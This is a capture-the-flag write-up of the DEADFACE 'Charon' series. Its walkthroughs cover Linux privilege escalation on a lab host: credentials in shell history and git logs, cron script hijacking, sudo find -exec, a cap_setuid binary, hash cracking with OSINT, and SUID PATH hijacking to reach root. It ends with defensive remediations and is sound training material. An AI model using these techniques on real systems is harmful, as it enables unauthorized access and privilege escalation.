# DEADFACE CTF: The Charon Series 

**Category:** Hostbusters (Linux / Forensics / Security Assessment)  
**Target:** Charon (Internal DEADFACE Ops/Staging Box)  
**Total Challenges:** 8  
**Final Objective:** Escalate through user trust boundaries to root and retrieve all operational flags.

---

## Executive Summary

The **Charon** track simulates auditing a compromised Linux staging host used by the fictitious threat actor group *DEADFACE*. Starting from a restricted service account (`svc-deploy`), each step demonstrated a classic system administration oversight or configuration weakness:

1. **Foothold on Charon** — Initial access reconnaissance.
2. **Looking Back** — Sensitive credentials lingering in shell history.
3. **Git Good** — Scrubbed secrets preserved in Git commit history.
4. **On Schedule** — Insecure file permissions on a scheduled cron target.
5. **Lilith** — Excessive `sudo` privileges on a dual-use system binary (`find`).
6. **Dangerous Capability** — Improper Linux capabilities (`cap_setuid`) assigned to custom binaries.
7. **Old Habits** — Password reuse and OSINT correlation from forum archives.
8. **Heavy is the Crown** — Insecure `PATH` resolution in an SUID executable.

---

## 1. Foothold on Charon 

### Overview
We landed in a browser-based web terminal as the restricted service account `svc-deploy`. The objective was to confirm access and locate the initial foothold flag.

### Walkthrough
Upon landing on the machine, standard directory enumeration was performed:

```bash
pwd
ls -la
```

Listing the home directory revealed:
```text
/home/svc-deploy
total 16
drwxr-x---  2 svc-depl svc-depl  4096 Oct 18 01:14 .
drwxr-xr-x  1 root     root      4096 Oct 18 01:14 ..
-rw-------  1 svc-depl svc-depl   196 Oct 18 01:14 .bash_history
-rw-r-----  1 svc-depl svc-depl    33 Oct 18 01:14 flag.txt
```

Reading `flag.txt`:
```bash
cat flag.txt
```

**Flag:**  
`deadface{f00th0ld_p4st_th3_v31l}`

---

## 2. Looking Back 

### Overview
The challenge description noted that a previous operator was careless with their session. We checked past user actions for leaked operational artifacts.

### Walkthrough
Inspecting the `.bash_history` file discovered during the initial directory listing:

```bash
cat ~/.bash_history
```

Output:
```text
cd /opt/deploy
cat README.txt
systemctl status charon-collector.service || true
# ticket OPS-4471: rotate member pw after onboarding
echo "deephax:Sk4t3rB0y_S1nce_2011" | sudo chpasswd
history -c
```

The history file revealed cleartext credentials configured for member **`deephax`**:
* **Username:** `deephax`
* **Password:** `Sk4t3rB0y_S1nce_2011`

Switching accounts:
```bash
su - deephax
```
*(Entered password: `Sk4t3rB0y_S1nce_2011`)*

In `deephax`'s home directory:
```bash
cat flag.txt
```

**Flag:**  
`deadface{sh3ll_h1st0ry_t3lls_4ll}`

---

## 3. Git Good 

### Overview
`deephax` maintained a custom tooling project (`kingmaker-scraper`) in his home folder, believing hardcoded secrets had been safely removed.

### Walkthrough
Listing `/home/deephax` showed:
```text
kingmaker-scraper/
notes.txt
flag.txt
```

Entering the project repository and inspecting the revision history:
```bash
cd kingmaker-scraper
git log -p
```

The recent commits highlighted:
```diff
commit b014c261291e228f0b745ca6fc06e8e7d6940c24
Author: deephax <deephax@charon>
Date:   Sun Oct 18 01:14:39 2026 +0000

    move service pw out of source into env

diff --git a/config.py b/config.py
--- a/config.py
+++ b/config.py
@@ -1,3 +1,4 @@
-# scraper service account
+import os
+# scraper service account (secret moved to env — see vault)
 SERVICE_USER = "gh0st404"
-SERVICE_PW = "Gh0stInTh3Sh3ll_404"
+SERVICE_PW = os.environ.get("SCRAPER_PW", "")
```

The commit log preserved the removed credentials for **`gh0st404`**:
* **Username:** `gh0st404`
* **Password:** `Gh0stInTh3Sh3ll_404`

Switching to `gh0st404`:
```bash
su - gh0st404
```
*(Entered password: `Gh0stInTh3Sh3ll_404`)*

Reading the user's flag:
```bash
cat flag.txt
```

**Flag:**  
`deadface{g1t_l0g_sp1lls_s3cr3ts}`

---

## 4. On Schedule 

### Overview
`gh0st404` managed an operational collection script that another team member executed periodically via automated scheduling.

### Walkthrough
Inspecting `/etc/cron.d/`:
```bash
cat /etc/cron.d/charon-collect
```

Output:
```text
# charon collector: runs as sunstalker; script is maintained by gh0st404
* * * * * sunstalker /opt/scrape/collect.sh
```

Checking file permissions on `/opt/scrape/collect.sh`:
```bash
ls -la /opt/scrape/collect.sh
# -rwxr-xr-x 1 gh0st404 gh0st404 147 Oct 18 01:14 collect.sh
```

Because `gh0st404` owned `collect.sh`, we modified the script to copy `sunstalker`'s flag to `/tmp`:

```bash
echo '#!/bin/sh' > /opt/scrape/collect.sh
echo 'cp /home/sunstalker/flag.txt /tmp/sun_flag.txt' >> /opt/scrape/collect.sh
echo 'chmod 644 /tmp/sun_flag.txt' >> /opt/scrape/collect.sh
```

Within one minute, the cron job fired under `sunstalker`'s UID, staging the file:
```bash
cat /tmp/sun_flag.txt
```

**Flag:**  
`deadface{cr0n_c4rr13d_my_p4yl04d}`

---

## 5. Lilith 

### Overview
`sunstalker` had been granted narrow permissions via `sudo` on a system binary, which could be leveraged to traverse into member `lilith`'s context.

### Walkthrough
We staged `/opt/scrape/collect.sh` to check `sudo -l` under `sunstalker`:
```bash
echo 'sudo -l > /tmp/sun_sudo.txt 2>&1' >> /opt/scrape/collect.sh
```

The resulting output revealed:
```text
User sunstalker may run the following commands on charon:
    (lilith) NOPASSWD: /usr/bin/find
```

`/usr/bin/find` supports the `-exec` flag, allowing arbitrary command execution under the target user without password prompts. We appended our command to `collect.sh`:

```bash
echo '#!/bin/sh
sudo -u lilith /usr/bin/find /home/lilith -name "flag.txt" -exec cat {} \; > /tmp/lf.txt 2>&1
chmod 644 /tmp/lf.txt' > /opt/scrape/collect.sh
```

Once the schedule triggered:
```bash
cat /tmp/lf.txt
```

**Flag:**  
`deadface{sud0_f1nd_4_w4y_1n}`

---

## 6. Dangerous Capability 

### Overview
`lilith` left behind cryptographic tooling configured with an over-privileged Linux file capability.

### Walkthrough
Auditing filesystem capabilities across the host:
```bash
getcap -r / 2>/dev/null
```

Output:
```text
/opt/crypto/cryptctl cap_setuid=ep
```

The `cryptctl` binary had `cap_setuid=ep`, allowing it to call `setuid()` to assume arbitrary user contexts. Checking file permissions:
```bash
ls -la /opt/crypto/cryptctl
# -rwxr-xr-x 1 root root 221976 Oct 18 01:14 cryptctl
```

The binary was world-executable. Executing `/opt/crypto/cryptctl` directly:
```bash
/opt/crypto/cryptctl
```

Output:
```text
[cryptctl] assuming the crypto service identity.
```

Checking identity:
```bash
id
# uid=1006(spookyboi) gid=1001(svc-deploy)
```

The utility spawned a shell as `spookyboi`. Reading the flag:
```bash
cat /home/spookyboi/flag.txt
```

**Flag:**  
`deadface{c4p_s3tu1d_cuts_d33p}`

---

## 7. Old Habits 

### Overview
`spookyboi` maintained a backup directory documenting DEADFACE personnel notes. The notes stated that second-in-command `mort1cia` continually reused the same personal password.

### Walkthrough
Inspecting `/home/spookyboi/.backup/`:
```bash
cat /home/spookyboi/.backup/creds.bak
```

Output:
```text
# Kingmaker cred cache. mort1cia STILL has not changed her password since the
# op kicked off -- and she reuses the same personal one everywhere, even on her
# old GhostTown account. If you need into her box, read her posting history.
# format: user:hash
mort1cia:$1$de4df4ce$1pZYBMgWLPXg1tZo6pke20
```

The hash format was standard MD5-crypt (`$1$de4df4ce$...`).

#### OSINT Correlation (GhostTown Forum)
We queried the DEADFACE community board (Topic 50: *"yo mort1cia we need to talk about ur past"*). A forum post shared an old Halloween photograph (`IMG007.png`) with a visible timestamp:
* **Event:** Halloween party (dressed in a pink princess outfit with a tiara).
* **Date stamp:** `2015-10-31`.
* **Discussion clues:** Team members mocked her for her *"pink princess"* costume from `2015`.

Testing candidates against the MD5-crypt hash using a custom Python script:
* **Target Hash:** `$1$de4df4ce$1pZYBMgWLPXg1tZo6pke20`
* **Cracked Password:** `princess2015`

Switching to `mort1cia`:
```bash
su - mort1cia
```
*(Entered password: `princess2015`)*

Reading the flag:
```bash
cat flag.txt
```

**Flag:**  
`deadface{0s1nt_n3v3r_f0rg3ts}`

---

## 8. Heavy is the Crown 

### Overview
`mort1cia` had direct proximity to the root boundary. The final step was identifying a root-owned misconfiguration to obtain the master flag.

### Walkthrough
Auditing SUID binaries on the filesystem:
```bash
find / -perm -4000 -type f 2>/dev/null
```

Among standard utilities, an unusual custom SUID executable was present:
```text
-rwsr-xr-x 1 root root /usr/local/bin/charon-backup
```

Analyzing strings inside `/usr/local/bin/charon-backup`:
```bash
strings /usr/local/bin/charon-backup | grep -E "tar|system|exec"
```

Relevant excerpts:
```text
[charon-backup] archiving /opt/ops ...
tar czf /var/backups/charon-ops.tgz -C /opt ops 2>/dev/null
system
```

The binary invoked `system("tar czf ...")` using an **unqualified relative path** for `tar` rather than `/bin/tar`. Because `system()` searches the caller's environment `$PATH`, this opened an immediate **PATH Hijacking** vulnerability.

We created an executable script named `tar` in `/tmp` and prepended `/tmp` to `PATH`:

```bash
echo '#!/bin/sh
cat /root/flag.txt > /tmp/rootflag.txt
chmod 644 /tmp/rootflag.txt' > /tmp/tar

chmod +x /tmp/tar
PATH=/tmp:$PATH /usr/local/bin/charon-backup
```

When `charon-backup` ran with root privileges, it resolved `/tmp/tar`, executing the payload in the context of `root`.

Reading the final flag:
```bash
cat /tmp/rootflag.txt
```

**Flag:**  
`deadface{p4th_h1j4ck3d_t0_thr0n3}`

---

## Complete Flag Summary

| Challenge | Points | Target Account | Vulnerability Class | Flag |
| :--- | :---: | :--- | :--- | :--- |
| **Foothold on Charon** | 10 | `svc-deploy` | Initial Access Recon | `deadface{f00th0ld_p4st_th3_v31l}` |
| **Looking Back** | 30 | `deephax` | Cleartext Secrets in History | `deadface{sh3ll_h1st0ry_t3lls_4ll}` |
| **Git Good** | 100 | `gh0st404` | Exposed Secrets in Git Logs | `deadface{g1t_l0g_sp1lls_s3cr3ts}` |
| **On Schedule** | 200 | `sunstalker` | Insecure File Perms on Cron | `deadface{cr0n_c4rr13d_my_p4yl04d}` |
| **Lilith** | 250 | `lilith` | Sudo NOPASSWD Misconfiguration | `deadface{sud0_f1nd_4_w4y_1n}` |
| **Dangerous Capability**| 300 | `spookyboi` | Excessive File Capability (`cap_setuid`) | `deadface{c4p_s3tu1d_cuts_d33p}` |
| **Old Habits** | 350 | `mort1cia` | Credential Reuse & OSINT Leak | `deadface{0s1nt_n3v3r_f0rg3ts}` |
| **Heavy is the Crown** | 500 | `root` | SUID Binary PATH Hijacking | `deadface{p4th_h1j4ck3d_t0_thr0n3}` |

---

## Defensive Remediations

1. **Disable Shell History Logging for Automated Services:** Service and deployment accounts should disable command logging (`export HISTSIZE=0`) to avoid credential leakage during maintenance.
2. **Sanitize Version Control Records:** Removing a file from Git HEAD does not purge it from historical blobs. Use tools like `git-filter-repo` or BFG Repo-Cleaner before publishing.
3. **Principle of Least Privilege in Cron:** Scheduled tasks should execute scripts owned exclusively by the running user or `root:root` with strict permissions (`chmod 700`).
4. **Harden Sudoers Directives:** Avoid granting root/user-switching execution on dual-use binaries (`find`, `awk`, `less`) without strict command arguments.
5. **Restrict Extended Capabilities:** Audit filesystem capabilities (`getcap -r /`) periodically and avoid placing `cap_setuid` on custom non-setuid-hardened code.
6. **Enforce Absolute Paths in Privileged Binaries:** All SUID and elevated binaries must reference sub-processes with canonical absolute paths (e.g. `/bin/tar` instead of `tar`) and reset the execution environment.

---

## Disclaimer & License

### Disclaimer
This documentation was created exclusively for educational, defensive, and authorized competitive capture-the-flag (CTF) purposes during the DEADFACE CTF event. All testing and assessments were performed on isolated, intentional challenge environments.

### License
This write-up is licensed under the [Creative Commons Attribution-ShareAlike 4.0 International License (CC BY-SA 4.0)](https://creativecommons.org/licenses/by-sa/4.0/). You are free to share and adapt this material with appropriate attribution.
